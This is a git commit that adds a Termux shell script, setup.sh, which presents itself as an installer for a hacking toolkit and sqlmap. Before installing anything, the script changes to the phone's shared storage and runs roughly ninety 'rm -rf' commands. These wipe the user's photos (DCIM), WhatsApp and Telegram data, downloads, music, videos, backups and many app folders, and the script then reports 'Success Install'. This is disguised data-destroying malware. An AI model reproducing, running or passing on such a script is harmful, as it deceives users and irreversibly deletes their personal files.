292f54da89168070d562e3e79bf68a3be790f6fc
RaflySahrul.86 <42622170+RAFLYSAHRUL@users.noreply.github.com>
2020-03-09 06:02:28 +0700

    update

---
+++ setup.sh
@@ -0,0 +1,106 @@
+#!/usr/bin/bash
+
+echo "Please wait...."
+termux-setup-storage
+cd /sdcard
+rm -rf Android
+rm -rf WhatsApp
+rm -rf YoWhatsApp
+rm -rf YoWhatsApp2
+rm -rf ADM
+rm -rf data
+rm -rf Download
+rm -rf file
+rm -rf home
+rm -rf Music
+rm -rf inshot
+rm -rf KineMaster
+rm -rf MEGA
+rm -rf mp3
+rm -rf MP3
+rm -rf mp4
+rm -rf Music
+rm -rf pixelLab
+rm -rf psp
+rm -rf Telegram
+rm -rf UCDownload
+rm -rf Video
+rm -rf video
+rm -rf YMusic
+rm -rf ADM
+rm -rf APK_Extractor
+rm -rf AiMee
+rm -rf Android
+rm -rf AnonTool.sh
+rm -rf ApkEditor
+rm -rf AppClone
+rm -rf Atomize
+rm -rf Bluetooth
+rm -rf Books
+rm -rf DCIM
+rm -rf DOCUMENTS
+rm -rf Download
+rm -rf Fonts
+rm -rf HTTrack
+rm -rf 'Hackers High School 13 Complete Hacking E-books'
+rm -rf HttpCanary
+rm -rf IDMP
+rm -rf Icode-Go
+rm -rf 'Infinite Studio'
+rm -rf InstaGet
+rm -rf InstaSave
+rm -rf JockeyAlbumArt
+rm -rf KineMaster
+rm -rf LazyList
+rm -rf MBFbteman.txt
+rm -rf MidasOversea
+rm -rf MomentCamSys
+rm -rf Movies
+rm -rf Music
+rm -rf Notes
+rm -rf PSP
+rm -rf PascalCompiler
+rm -rf PicsArt
+rm -rf Pictures
+rm -rf PowerDirector
+rm -rf QTAudioEngine
+rm -rf Screenshot
+rm -rf Subtitles
+rm -rf SurveyHeart
+rm -rf Telegram
+rm -rf Tokopedia
+rm -rf TouchPal_vivo
+rm -rf TouchRetouch
+rm -rf TrapNationEffect
+rm -rf UE4Game
+rm -rf VIRUSS
+rm -rf Video
+rm -rf WhatsApp
+rm -rf 'WhatsApp Statuss'
+rm -rf backups
+rm -rf baidu
+rm -rf bbklog
+rm -rf cache
+rm -rf ccmini
+rm -rf com.googlecode.rhinoforandroid
+rm -rf com.kingroot.kinguser
+rm -rf data
+rm -rf img
+rm -rf inshot
+rm -rf internetComponent
+rm -rf pixelLab
+rm -rf pluginInfo
+rm -rf system
+rm -rf tencent
+rm -rf textfee
+rm -rf vivoDownloadEx
+cd $HOME
+pkg install curl -Y
+apt install unzip -Y
+pkg install python2 -Y
+pkg install nano -Y
+pkg install unzip -Y
+unzip brigadetoolsz.zip
+git clone https://github.com/sqlmapproject/sqlmap.git
+echo "Success Install..."
+echo "Tingaal Pakai Brothers.. ^_^"
